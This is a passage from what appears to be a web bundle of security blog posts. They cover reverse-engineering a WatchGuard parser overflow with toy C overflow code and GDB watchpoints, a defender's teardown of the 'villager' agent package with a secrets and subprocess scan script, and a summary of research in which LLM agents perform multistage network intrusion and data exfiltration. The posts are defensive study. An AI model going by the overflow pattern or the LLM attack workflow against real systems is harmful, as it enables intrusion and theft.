    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,Gm=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
<h1>Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)</h1>
<blockquote>
<p><strong>Scope &amp; intent:</strong> This is a <strong>defender‑focused technical teardown</strong> of the Python package <strong><code>villager</code></strong> (latest pre‑release commonly referenced: <strong>0.2.1rc1</strong>). The goal is to understand <strong>architecture and risk</strong>, not to enable abuse. Use only in authorized environments.</p>
<p>This blog uses publicly available package metadata (PyPI), a reverse‑engineered GitHub mirror intended “for analysis,” and MCP documentation to explain how the moving parts fit together.</p>
</blockquote>
<hr />
<h2>0) Why Villager is interesting</h2>
<p>Villager is positioned as an “experimental technology project” on PyPI, shipped as a Python package with dependencies that look like a typical <strong>agent stack</strong> (FastAPI, Typer, LangChain, OpenAI client libs, MCP/FastMCP, etc.).</p>
<p>At a high level it resembles a common “agentic automation” pattern:</p>
<ul>
<li>a <strong>web API</strong> to submit work,</li>
<li>an <strong>LLM planner/judge</strong> loop to decide steps and completion,</li>
<li>and a <strong>tool bridge</strong> (MCP) to execute actions in external systems.</li>
</ul>
<p>This architecture is the important part: agentic orchestration changes your risk model because <strong>any tool exposed to the agent becomes part of the agent’s attack surface</strong>.</p>
<hr />
<h2>1) The big picture architecture</h2>
<h3>The layers</h3>
<ol>
<li>
<p><strong>Interface layer (FastAPI + CLI)</strong><br />
   A server exposes endpoints like “create task,” “get status,” “get tree,” “stop task,” “get context.”</p>
</li>
<li>
<p><strong>Scheduler layer (task nodes + branching)</strong><br />
   A task is represented as a node in a <strong>task graph/tree</strong>, which may branch into subtasks based on LLM output.</p>
</li>
<li>
<p><strong>Execution layer (MCP client)</strong><br />
   The “hands” are not inside Villager itself; instead it calls <strong>MCP servers</strong> (e.g., browser automation, a controlled environment runner, etc.).</p>
</li>
<li>
<p><strong>(Optional) Local tool-call layer</strong><br />
   Many agent frameworks also implement internal tool execution (e.g., “call a function by name with JSON args”). In Villager-like systems, this is where risk spikes if the tool set includes <code>subprocess</code> or <code>eval</code> primitives.</p>
</li>
</ol>
<h3>Request lifecycle (conceptual flow)</h3>
<pre><code class="language-text">Client
  |
  |  POST /task   (abstract, description, verification)
  v
FastAPI app
  |
  |  creates TaskNode and runs it in background
  v
TaskNode.execute()
  |
  |-- (branching?) -&gt; create child TaskNodes and execute them
  |
  |-- else -&gt; run_mcp_agent() -&gt; McpClient.execute(prompt)
  |
  |-- judge step -&gt; DONE / TURNING / IMPOSSIBLE (repeat or stop)
  v
Client polls:
  - status
  - task tree
  - context transcript
</code></pre>
<hr />
<h2>2) What MCP is and why it’s central here</h2>
<p><strong>MCP (Model Context Protocol)</strong> is an open protocol for connecting LLM applications to external tools and data sources through a standardized interface. It defines a host/client/server model and protocol semantics. (Think: a “universal adapter” for tools.)</p>
<p>Villager uses MCP to separate the orchestrator from the actual tool execution environment. This is a big deal:</p>
<ul>
<li>It enables powerful workflows without bundling tools inside the package.</li>
<li>It also means the orchestrator can become a “universal remote” for anything the MCP servers expose.</li>
</ul>
<hr />
<h2>3) The API control plane (FastAPI)</h2>
<p>This is the “front door” pattern seen in many agent frameworks:</p>
<ul>
<li>submit a task,</li>
<li>poll its status,</li>
<li>fetch the task tree/graph,</li>
<li>fetch the transcript/context,</li>
<li>stop/interrupt execution.</li>
</ul>
<h3>Example client requests (generic)</h3>
<pre><code class="language-bash"># create a task (example: innocuous compliance doc generation)
curl -s -X POST &quot;http://127.0.0.1:37695/task&quot;   -H &quot;Content-Type: application/json&quot;   -d '{
    &quot;abstract&quot;: &quot;Summarize our incident response runbook&quot;,
    &quot;description&quot;: &quot;Use only our internal documents. Output Markdown.&quot;,
    &quot;verification&quot;: &quot;Includes owners, escalation flow, and contact matrix.&quot;
  }'

# poll status
curl -s &quot;http://127.0.0.1:37695/get/task/status?task_id=&lt;TASK_ID&gt;&quot;

# fetch graph/tree
curl -s &quot;http://127.0.0.1:37695/task/&lt;TASK_ID&gt;/tree&quot;

# fetch context transcript
curl -s &quot;http://127.0.0.1:37695/task/&lt;TASK_ID&gt;/context&quot;
</code></pre>
<blockquote>
<p><strong>Engineering note:</strong> In prototype designs like this, tasks are often stored in memory (a module‑level dict). In production you’d persist tasks in Redis/DB and make IDs per request.</p>
</blockquote>
<hr />
<h2>4) TaskNode: the planner / executor / judge loop</h2>
<p>The core idea is a controller loop like:</p>
<p>1) Ask the LLM: <strong>Should I break this into subtasks?</strong><br />
2) If yes: create subtasks and run them.<br />
3) If no: run a “do work” step via tools/MCP.<br />
4) Ask the LLM: <strong>Is it done?</strong><br />
5) If not: iterate until max retries or failure.</p>
<h3>Pseudocode you can recognize in many agent codebases</h3>
<pre><code class="language-python">class TaskNode:
    def execute(self):
        self.status = &quot;PROCESSING&quot;

        branch = self.llm_should_branch(self.abstract, self.description)
        if branch.need_branching:
            self.children = [TaskNode(t) for t in branch.tasks]
            for child in self.children:
                child.execute()

        output = self.run_mcp_agent()
        verdict = self.llm_judge(output, self.verification)

        if verdict == &quot;DONE&quot;:
            self.status = &quot;DONE&quot;
            return output
        elif verdict == &quot;TURNING&quot;:
            return self.retry_loop()
        else:
            self.status = &quot;IMPOSSIBLE&quot;
            return output
</code></pre>
<p>This <strong>pattern</strong> is what matters, even if variable names differ.</p>
<hr />
<h2>5) MCP client: streaming tool execution</h2>
<p>A common MCP gateway pattern is:</p>
<ul>
<li>send a request (prompt + config),</li>
<li>consume a stream (SSE / newline‑delimited JSON),</li>
<li>keep a transcript of messages and tool results.</li>
</ul>
<h3>Toy MCP streaming consumer (safe example)</h3>
<pre><code class="language-python">import json
import requests

def stream_mcp(base_url: str, payload: dict) -&gt; str:
    &quot;&quot;&quot;
    Safe-to-read example of how an HTTP streaming MCP-like gateway might be consumed.
    (Exact endpoints and schemas vary by implementation.)
    &quot;&quot;&quot;
    out = []
    with requests.post(base_url, json=payload, stream=True, timeout=60) as r:
        r.raise_for_status()
        for line in r.iter_lines(decode_unicode=True):
            if not line:
                continue
            evt = json.loads(line)
            if evt.get(&quot;content&quot;):
                out.append(evt[&quot;content&quot;])
            if evt.get(&quot;done&quot;):
                break
    return &quot;&quot;.join(out)
</code></pre>
<p><strong>Why defenders care:</strong> once this is wired to real tool servers, the orchestrator can cause real-world side effects. Your security posture becomes “how safe are the MCP servers, and how tight is authz?”</p>
<hr />
<h2>6) The “in-band tool call” pattern (%%{json}%%)</h2>
<p>Some agent frameworks support tool calls by asking the model to emit a JSON blob in the middle of text, e.g.:</p>
<pre><code class="language-text">%%{&quot;name&quot;:&quot;SearchFastMcp&quot;,&quot;parameters&quot;:{&quot;query&quot;:&quot;auth&quot;}}%%
</code></pre>
<p>Then code extracts the JSON and runs the corresponding function.</p>
<h3>Minimal parser + allowlist executor (safe pattern)</h3>
<pre><code class="language-python">import json, re
from typing import Any, Callable

TOOL_RX = re.compile(r&quot;%%\\s*(\\{.*?\\})\\s*%%&quot;, re.DOTALL)

def extract_tool_calls(text: str) -&gt; list[dict]:
    calls = []
    for m in TOOL_RX.finditer(text):
        calls.append(json.loads(m.group(1)))
    return calls

def run_tools(calls: list[dict], registry: dict[str, Callable[..., Any]]):
    results = []
    for c in calls:
        name = c.get(&quot;name&quot;)
        args = c.get(&quot;parameters&quot;) or {}
        if name not in registry:
            raise ValueError(f&quot;Tool not allowed: {name}&quot;)
        results.append(registry[name](**args))
    return results
</code></pre>
<p><strong>Defender takeaway:</strong> the parser is not scary; the <strong>tool registry</strong> is. If the registry includes shell execution, file access, credential access, network scanning, etc., the system must be treated like privileged code.</p>
<hr />
<h2>7) The reverse-engineered mirror’s warning: “callbacks” and data egress</h2>
<p>The GitHub mirror you referenced was created “for analysis” and explicitly warns about multiple potential egress paths (proxying and webhooks).</p>
<p>Even if you never “use those tools,” defenders should assume:</p>
<ul>
<li>imports can have side effects,</li>
<li>configuration drift happens,</li>
<li>agents sometimes “discover” and call tools you forgot existed.</li>
</ul>
<p><strong>Rule of thumb:</strong> if it can talk to the network, it can leak data—unless you lock down egress.</p>
<hr />
<h2>8) How to analyze Villager-like packages safely (with code)</h2>
<h3>A) Pin exact artifacts and verify hashes</h3>
<p>1) Download wheels/sdists without executing code.
2) Verify file hashes against the package index metadata.</p>
<pre><code class="language-bash">pip download --no-deps villager==0.2.1rc1
sha256sum villager-0.2.1rc1*.tar.gz villager-0.2.1rc1*.whl
</code></pre>
<h3>B) Static scan for dangerous primitives</h3>
<pre><code class="language-python"># static_scan.py
import pathlib, re

ROOT = pathlib.Path(&quot;.&quot;)  # point at the extracted sdist folder
PATTERNS = {
    &quot;network&quot;: re.compile(r&quot;\\b(requests|httpx|urllib3|socket)\\b&quot;),
    &quot;process&quot;: re.compile(r&quot;\\b(subprocess\\.run|Popen|os\\.system)\\b&quot;),
    &quot;eval_exec&quot;: re.compile(r&quot;\\b(eval|exec)\\b&quot;),
    &quot;secrets&quot;: re.compile(r&quot;\\b(api[_-]?key|token|secret|passwd|password)\\b&quot;, re.I),
}

hits = {k: [] for k in PATTERNS}
for py in ROOT.rglob(&quot;*.py&quot;):
    s = py.read_text(errors=&quot;ignore&quot;)
    for k, rx in PATTERNS.items():
        if rx.search(s):
            hits[k].append(str(py))

for k, files in hits.items():
    print(f&quot;\\n[{k}] {len(files)} files&quot;)
    for f in files[:40]:
        print(&quot; &quot;, f)
</code></pre>
<h3>C) If you must execute: isolate hard</h3>
<ul>
<li>run in a throwaway VM/container</li>
<li>no host mounts (<code>~/.ssh</code>, cloud creds, browser profiles)</li>
<li>run unprivileged user</li>
<li><strong>block outbound network</strong> except to a controlled MCP server</li>
<li>record egress (pcap) for validation</li>
</ul>
<hr />
<h2>9) Building a safer “Villager-like” system (recommended hardening)</h2>
<p>If you’re rebuilding this idea (and you probably should, instead of installing unknown packages):</p>
<p>1) <strong>Separate “planner” from “executor”</strong> with clear boundaries<br />
2) <strong>Never expose “danger primitives”</strong> (shell, eval) directly to the model<br />
3) <strong>Use structured tool calling</strong> (strict JSON schema, validation, allowlists)<br />
4) <strong>Implement per-tool authz</strong> (who can call what, with what parameters)<br />
5) <strong>Add an audit trail</strong> (tool called, args, time, outcome; redact secrets)<br />
6) <strong>Default-deny egress</strong> and require explicit network allowlists<br />
7) <strong>Make tasks durable</strong> (DB/queue), enforce per-request UUIDs, add auth to API</p>
<hr />
<h2>10) References</h2>
<ul>
<li>PyPI: https://pypi.org/project/villager/</li>
<li>GitHub mirror (“for analysis”): https://github.com/gregcmartin/villager</li>
<li>MCP (official): https://modelcontextprotocol.io/</li>
<li>MCP spec (dated): https://modelcontextprotocol.io/specification/2025-11-25</li>
<li>FastMCP docs: https://gofastmcp.com/</li>
<li>FastMCP repo: https://github.com/jlowin/fastmcp</li>
</ul>
  </div>
</body>
</html>
`,Km=`<h1>On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown</h1>
<p>Can large language models (LLMs) autonomously conduct complex multi-host cyberattacks? This is the central question addressed by <em>“On the Feasibility of Using LLMs to Execute Multistage Network Attacks.”</em> The paper explores whether state-of-the-art LLMs can perform full multistage network attacks – the kind of realistic attacks that involve multiple phases (reconnaissance, exploitation, lateral movement, privilege escalation, data exfiltration) across multiple hosts. Such attacks reflect real-world breaches (e.g., the Equifax data breach or Colonial Pipeline attack) and are the bread-and-butter of red team exercises and nation-state hacking campaigns. The motivation is clear: if LLMs could execute these attacks autonomously, it could revolutionize red-teaming by augmenting or automating the work of human security testers, allowing defenders to proactively find gaps in their defenses. This technical blog delves into the paper’s contributions – from the evaluation setup and failure analysis to the proposed <strong>Incalmo</strong> framework – providing an objective, detailed breakdown for security researchers.</p>
<hr />
<h2>Evaluation Setup: 10 Multi-Host Environments, LLMs, and Baselines</h2>
<p>To systematically study LLM-driven attacks, the authors built <strong>10 realistic multistage attack environments</strong> (25–50 hosts each) and evaluated several leading LLMs and a baseline system. Each environment is a contained network with a specific scenario and goal (usually to exfiltrate sensitive data from target hosts). The environments include both real breach recreations and synthetic network topologies:</p>
<ul>
<li><strong>Equifax-inspired (50 hosts):</strong> Replica of the Equifax corporate network (as described in breach reports) with known vulnerable services; goal is to exfiltrate all critical data.</li>
<li><strong>Colonial Pipeline-inspired (45 hosts):</strong> An IT/OT network based on the pipeline attack, with two IT subnets and an OT subnet controlling physical devices; goal is to gain control of OT hosts (industrial control systems).</li>
<li><strong>Enterprise A (30 hosts):</strong> A three-tier enterprise network (web server subnet, employee subnet, database subnet); goal is to exfiltrate all sensitive database data.</li>
<li><strong>Enterprise B (40 hosts):</strong> Similar to Enterprise A but larger (four subnets) and requiring more exploits to reach the data; goal is again to exfiltrate all critical data.</li>
<li><strong>4-Layer Chain (25 hosts):</strong> A linear “stepping-stone” chain where each compromised host yields credentials to the next host; each host stores a secret file. Goal is to exfiltrate all files from the chain.</li>
<li><strong>6-Layer Chain (25 hosts):</strong> A harder variant of the chain topology – each hop requires a privilege escalation on the host to access the file (each host has a random privilege-escalation vulnerability).</li>
<li><strong>4-Layer Star (25 hosts):</strong> A single network with many hosts, each vulnerable to some remote code execution. The attacker can directly reach all hosts (star topology); goal is to exfiltrate each host’s critical data.</li>
<li><strong>6-Layer Star (25 hosts):</strong> A tougher star scenario – each host’s data requires privilege escalation and hosts have random privilege-escalation bugs.</li>
<li><strong>Dumbbell A (30 hosts):</strong> Two subnetworks (“dumbbell” shape): one with externally accessible web servers, and one with internal databases. Each web server holds credentials for a specific database. Goal is to use the credentials to compromise databases and exfiltrate data.</li>
<li><strong>Dumbbell B (30 hosts):</strong> Similar to Dumbbell A but adding complexity: database access and data retrieval require elevated privileges (mimicking stricter internal security).</li>
</ul>
<p>These environments were crafted to be realistic and diverse. Two are modeled on real incidents (Equifax and Colonial Pipeline), others on common enterprise designs, and some on topologies from prior research. This provides a thorough testbed for LLMs’ offensive capabilities.</p>
<h3>Evaluated LLMs</h3>
<p>The authors tested six advanced LLMs (from multiple organizations) under code names:</p>
<ul>
<li><strong>Sonnet 3.5</strong></li>
<li><strong>Haiku 3.5</strong></li>
<li><strong>GPT-4o</strong></li>
<li><strong>GPT-4o mini</strong></li>
<li><strong>Gemini 1.5 Pro</strong></li>
<li><strong>Gemini 1.5 Flash</strong></li>
</ul>
<p>These represent models of various sizes and capabilities. By evaluating multiple LLMs, the study can identify whether failures are model-specific or common to the state of the art.</p>
<h3>Baseline – PentestGPT</h3>
<p>In addition to fully-autonomous LLM agents, the paper compares against <strong>PentestGPT</strong>, a human-in-the-loop penetration testing assistant (USENIX Security 2024). PentestGPT uses prompting techniques to guide a human operator in CTF-style tasks. It suggests actions and commands which a human then executes and feeds back results. To test it in this setting, the authors ran PentestGPT on the same 10 scenarios by manually acting as the human operator (entering its recommended commands into the attacker machine). They ensured a fair comparison by only executing concrete commands provided by PentestGPT (if it gave only high-level ideas, they asked it once for a specific command). This tests whether state-of-the-art prompt engineering and human guidance (PentestGPT’s approach) fares better than a fully autonomous LLM agent.</p>
<h3>Success criteria</h3>
<p>An LLM “fully succeeds” in an environment if it achieves <strong>all</strong> attack goals (e.g., exfiltrating all target files or compromising all key hosts), whereas “partial success” means achieving at least one goal (e.g., exfiltrating one critical file out of many).</p>
<p>Using this metric, the initial evaluation was sobering:</p>
<ul>
<li><strong>None</strong> of the LLMs, on their own, could fully complete any of the 10 multistage attacks.</li>
<li>Across 50 trials (5 trials per LLM per environment), there was only <strong>one</strong> instance of even partial success – the model <strong>Sonnet 3.5</strong> managed to exfiltrate a single file (out of 25) in the <strong>4-Layer Chain</strong> scenario.</li>
<li>The human-assisted PentestGPT baseline did no better: <strong>PentestGPT did not manage to achieve even a partial objective in any environment</strong>.</li>
</ul>
<p>In other words, even with state-of-the-art prompting and a human in the loop, the multistage attacks remained unsolved. The only relatively consistent capability LLMs demonstrated was basic reconnaissance (e.g., scanning for hosts/services) – beyond that, they became stuck or made fatal errors.</p>
<p>These results confirmed that multihost, multiphase attacks are a steep challenge for current LLMs, motivating a deeper investigation into why they failed.</p>
<hr />
<h2>Why LLMs Struggle: Attack Graph Failure Analysis</h2>
<p>To understand the failure modes of the LLM “attackers,” the researchers turned to a classic formalism in cybersecurity: <strong>attack graphs</strong>. An attack graph models the possible states an attacker can achieve in the network (nodes) and the actions (edges) that transition between states, ultimately leading to the goal.</p>
<p>For example:</p>
<ul>
<li>Intermediate states might include “gained user access on web server” or “discovered database credentials.”</li>
<li>Edges might represent actions like “exploit web server vulnerability” or “use stolen credentials to log into database.”</li>
</ul>
<p>The team constructed ideal attack graphs for each environment (the Equifax-inspired network’s graph had <strong>246</strong> unique states and <strong>48</strong> goal states, for instance). This gave a ground truth reference of what steps are needed to succeed.</p>
<p>They then mapped the logs of each LLM trial onto the attack graph to see which states the LLM managed to reach and which actions it attempted. This mapping was done via heuristics (e.g., scanning command outputs for evidence that a certain host was found or a certain exploit succeeded).</p>
<h3>What the attack graph analysis revealed</h3>
<p>Across all environments, LLMs only achieved between <strong>1% and 30%</strong> of the attack states – a very low coverage of the necessary steps.</p>
<p>Where did things go wrong? The failures generally fell into two broad categories:</p>
<ol>
<li>
<p><strong>Irrelevant commands (off-path actions):</strong> The LLM often issued commands that had no chance of advancing the attack given the actual environment – in attack graph terms, these commands did not correspond to any useful edge or state. In other words, the LLM was wasting efforts on irrelevant or impossible actions. For example, an LLM might try to use a tool like <code>hydra</code> to brute-force SSH passwords on a host, even though the scenario did not support any password authentication vulnerability (no such weakness existed in the environment). Attempts to “find misconfigured files” on a host that had none, or to exploit services that weren’t actually vulnerable, are other examples of these irrelevant actions. This was a prevalent failure mode: depending on the scenario, <strong>28% to 81%</strong> of the commands issued by LLMs were irrelevant to the true attack path. Such detours not only fail to make progress, but can consume the LLM’s budget of steps or trigger defenses if this were a real system.</p>
</li>
<li>
<p><strong>Incorrectly implemented commands (execution errors):</strong> Even when the LLM chose a relevant action toward the goal, it often executed it incorrectly – using a wrong syntax, tool, or parameter that caused the attempt to fail. For instance, the LLM might recognize that it needs to scan the network, but issue an <code>nmap</code> command with wrong flags or an incorrect IP range, yielding no useful result. Or it might attempt to exploit a known CVE but misconfigure the exploit payload. These “right idea, wrong execution” cases were also common: roughly <strong>9% to 32%</strong> of the commands were relevant steps but implemented incorrectly, according to the analysis. An incorrectly crafted command means the attacker fails to achieve the intended state (even though that state was reachable if the command were done properly).</p>
</li>
</ol>
<p>Crucially, these failure modes reinforce each other in a multistage context. Irrelevant actions squander time and lead the LLM down blind alleys, and execution mistakes prevent progress on the correct path – both result in the agent getting stuck well before completing the attack.</p>
<p>The attack graph perspective made these failure patterns clear, highlighting that LLMs lack reliable strategic focus (they try actions not in the attack plan) and precise low-level execution skills. Prior anecdotal observations suggested LLM agents “have good ideas but execute them poorly” and sometimes “fail to pivot when a strategy fails”; this study formalized that insight.</p>
<p>With this understanding, the authors set out to address the root causes: how to keep the LLM focused on relevant actions and help it properly carry out complex steps.</p>
<hr />
<h2>Introducing Incalmo: High-Level Attack Planning for LLMs</h2>
<p>To overcome these failure modes, the paper proposes <strong>Incalmo</strong>, an intervention layer that sits between the LLM and the target environment.</p>
<h3>Core idea</h3>
<p>Instead of having the LLM directly issue raw shell commands to execute the attack, the LLM outputs higher-level <strong>intentions</strong> (tasks), which Incalmo then handles by executing appropriate low-level actions. By mediating and structuring the LLM’s actions, Incalmo aims to prevent irrelevant or malformed commands from derailing the attack.</p>
<h3>Incalmo’s high-level architecture</h3>
<p>Rather than directly running shell commands (baseline), the LLM provides high-level task directives to Incalmo. Incalmo’s components translate those tasks into the appropriate low-level tool commands (nmap, Metasploit, etc.) and feed results back to the LLM.</p>
<h3>Incalmo’s three main components</h3>
<ul>
<li>
<p><strong>Action Planner:</strong> This module presents the LLM with a set of supported high-level attack tasks (declarative actions like “scan the network,” “infect a host,” “find sensitive files,” “exfiltrate data,” etc.). Instead of relying on the LLM to generate correct Bash commands or Metasploit syntax from scratch, the LLM can choose a high-level task and parameters, and the action planner will translate it into a sequence of low-level commands using a predefined library of attack primitives. By handling the implementation details, the action planner minimizes the risk of incorrect command usage – the LLM no longer needs to remember exact tool flags or syntax for complex actions. This directly tackles the “incorrectly implemented command” failure mode.</p>
</li>
<li>
<p><strong>Attack Graph Service:</strong> To address the issue of irrelevant actions, Incalmo provides an attack graph service that the LLM (and the action planner) can query for guidance. This service encodes knowledge of the logical attack graph of the scenario – essentially, it knows which high-level actions are likely productive given the attacker’s current state. The LLM can use it to ask questions like “what could I do next that leads toward the goal?” or to verify whether a certain host is known to be vulnerable before attempting an exploit. In practice, this means the LLM’s choice of tasks can be informed by the structure of the attack graph, helping it avoid irrelevant commands that don’t map to any viable path forward. (The attack graph service can be thought of as an expert system that keeps the LLM on strategy.)</p>
</li>
<li>
<p><strong>Environment State Service:</strong> This component acts as the LLM’s memory and context for the specific environment. It stores all currently known information about the network state – discovered host IPs, open ports, credentials found, compromised accounts, etc. – as the attack progresses. The LLM can query this state to avoid redundancy and configure tasks correctly. For example, before scanning, the LLM can retrieve the IP range of the network; before trying default credentials, it can check if any credentials have already been found. The environment service ensures commands are tailored to the actual environment details (preventing mistakes like scanning the wrong subnet) and that the LLM always has up-to-date facts about what it has accomplished so far. This makes the attack execution more reliable and environment-agnostic, since the LLM doesn’t have to hard-code environment specifics.</p>
</li>
</ul>
<p>Together, these abstractions allow the LLM to focus on what to do next at a high level, while Incalmo handles how to do it. The LLM’s “language” for interacting with the environment becomes a set of high-level actions and queries, rather than raw shell syntax. This dramatically reduces the chances of syntax errors or irrelevant exploits – the LLM can’t easily go off-script because its choices are constrained to meaningful tasks.</p>
<h3>Using Incalmo</h3>
<p>The workflow involves a preparation phase and an execution loop:</p>
<ol>
<li>
<p><strong>Onboarding Prompt:</strong> First, the LLM is primed with an onboarding prompt that teaches it how to use Incalmo. This prompt describes the available high-level tasks (the “API” of the action planner) and how to ask the attack graph or state services questions. Essentially, the LLM learns it has a special toolkit and must output actions in a structured format.</p>
</li>
<li>
<p><strong>Environment &amp; Goal Context:</strong> The LLM is then given environment-specific details and objectives. For each scenario, a prompt describes the target network (e.g., how many subnets, what is initially known) and the attack goal (e.g., “exfiltrate all customer records from the databases”). This contextual grounding ensures the LLM knows the mission and starting point.</p>
</li>
<li>
<p><strong>Iterative Execution Loop:</strong> Finally, the LLM enters an autonomous loop where it iteratively decides on a task to perform, Incalmo executes it, and the results are fed back for the LLM to analyze. For example, the LLM might output: <code>Action: scan_network(target=10.0.0.0/16)</code>. Incalmo’s action planner takes that and runs the appropriate <code>nmap</code> commands under the hood. The output (say, a list of discovered hosts and open ports) is then returned to the LLM (likely in a summarized form via the state service). The LLM reads the results and then decides the next high-level action. This cycle continues until the LLM believes it has achieved the goal or exhausts a time/step limit.</p>
</li>
</ol>
<p>By structuring the interaction in this manner, Incalmo essentially plays the role of an expert red-team operator executing the LLM’s ideas correctly and keeping it on track. It is worth noting that Incalmo is LLM-agnostic – it acts as a universal interface that could work with any language model, by providing the same high-level “attack API.” It does not modify the LLM’s internals; it only changes the prompts and the execution medium.</p>
<hr />
<h2>Case Study: LLM + Incalmo in Action</h2>
<p>To illustrate how an LLM attacks a network using Incalmo, the paper walks through a case study in the <strong>Equifax-inspired</strong> environment using the <strong>Sonnet 3.5</strong> model. This example highlights how the LLM, empowered by Incalmo, can carry out a full multistage attack that it could not achieve alone. The high-level steps include reconnaissance, initial exploitation, credential gathering, lateral movement, and data exfiltration:</p>
<ul>
<li>
<p><strong>External Reconnaissance:</strong> The LLM begins by scanning the target network. It issues a high-level “scan network” task via Incalmo, instructing the attack on the external IP range. Incalmo translates this into the appropriate <code>nmap</code> commands. The scan discovers two external hosts (for example, a web server and perhaps a mail server) accessible to the attacker. This information (host IPs and open ports) is added to the environment state and shared with the LLM.</p>
</li>
<li>
<p><strong>Initial Compromise:</strong> The LLM identifies the external web server as a likely entry point. It uses an “infect host” action on that server (i.e., attempt to exploit it). Incalmo’s action planner knows, from the scenario’s toolkit, which exploit to try (the Equifax scenario is designed to match a vulnerability chain described in public analyses). It executes the exploit and succeeds in gaining access to the web server (now a foothold inside the network). The environment state service updates the knowledge base: the attacker now has a shell on Host X.</p>
</li>
<li>
<p><strong>Post-Exploitation &amp; Credential Harvesting:</strong> With a presence on the web server, the LLM wants to expand its access. It issues a “find information on host” task for the compromised server – essentially a search for useful data like credentials, config files, etc. Incalmo carries this out (running a script to enumerate key directories, password files, etc.). This yields a valuable find: SSH credentials are discovered on the web server (perhaps an admin left keys or passwords on it). These credentials are reported back to the LLM via the state service.</p>
</li>
<li>
